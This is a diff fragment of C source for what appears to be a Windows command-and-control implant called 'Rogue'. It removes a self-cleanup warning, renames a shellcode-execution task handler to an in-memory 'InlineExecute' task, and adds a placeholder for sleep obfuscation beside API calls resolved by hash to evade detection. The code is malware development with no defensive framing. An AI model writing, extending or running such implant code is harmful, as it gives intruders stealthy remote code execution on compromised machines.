@@ -136,21 +136,11 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 													Ret->ReturnCode = 0;
 													Ret->ErrorValue = 0;
 
-													/* Query Information about the current address space */
-													if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_PTR( Entry ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
-														/* Is the same address region? */
-														if ( U_PTR( NtCurrentPeb()->ImageBaseAddress ) == U_PTR( Mbi.AllocationBase ) ) {
-															/* Print a status message */
-															RoguePrintf( Ctx, C_PTR( G_PTR( "Rogue is within the process host PE, and will not free itself." ) ) );
-															RoguePrintf( Ctx, C_PTR( G_PTR( "Please ensure that you are cleaning up your host artifacts." ) ) );
-														};
-													};
-
 													/* Abort */
 													break;
-												case ShellcodeTask:
-													/* Execute ShellcodeTask */
-													Res = TaskShellcodeTask( Ctx, Req->Buffer, Req->Length, Onb );
+												case InlineExecute:
+													/* Execute InlineExecute */
+													Res = TaskInlineExecute( Ctx, Req->Buffer, Req->Length, Onb );
 													Ret = C_PTR( U_PTR( Onb->Buffer ) + sizeof( Ctx->Id ) );
 
 													/* Set return info */
@@ -184,6 +174,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					Inb = NULL; Rcv = FALSE;
 				};
 				/* ah shit!: insert obfuscate/sleep call here */
+				/* OBFUSCATe SLEEP IMPLEMENTATION GOES HERE */
 				if ( Ctx->Established != FALSE ) ( ( __typeof__( Sleep ) * ) PeGetFuncEat( PebGetModule( 0x6ddb9555 ), 0xe07cd7e ) )( 20000 );
 			};
 		};
